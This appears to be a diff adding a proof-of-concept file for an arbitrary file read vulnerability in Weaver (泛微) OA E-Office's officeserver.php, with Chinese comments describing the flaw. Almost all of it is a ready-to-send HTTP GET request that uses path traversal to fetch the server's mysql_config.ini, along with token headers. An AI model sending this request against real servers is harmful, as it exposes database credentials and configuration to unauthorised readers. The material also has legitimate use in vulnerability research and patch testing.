@@ -1,0 +1,9 @@
+# 泛微OA E-Office officeserver.php 任意文件读取漏洞
+# 泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件
+GET /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini&acid=80025434&bid=hd_tag_m8mv25zl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zl
+RM-PRO-Token: d14414da8e47c187cfb61016d3c2de0c
+RM-PRO-Time: 1742808516598
+User-Agent: curl/7.83.1
+
